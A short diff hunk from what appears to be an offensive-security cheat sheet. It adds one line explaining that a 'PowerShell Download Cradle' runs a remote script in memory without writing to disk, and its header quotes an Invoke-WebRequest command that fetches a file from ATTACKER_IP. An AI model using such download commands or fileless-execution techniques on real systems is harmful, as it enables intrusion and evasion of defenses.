@@ -203,7 +203,7 @@ Invoke-WebRequest http://ATTACKER_IP/file -OutFile file
 ---
 
 # 12. PowerShell Download Cradle
-
+The file is NOT saved to disk. It is executed directly in memory.
 Execute remote script:
 
 ```powershell
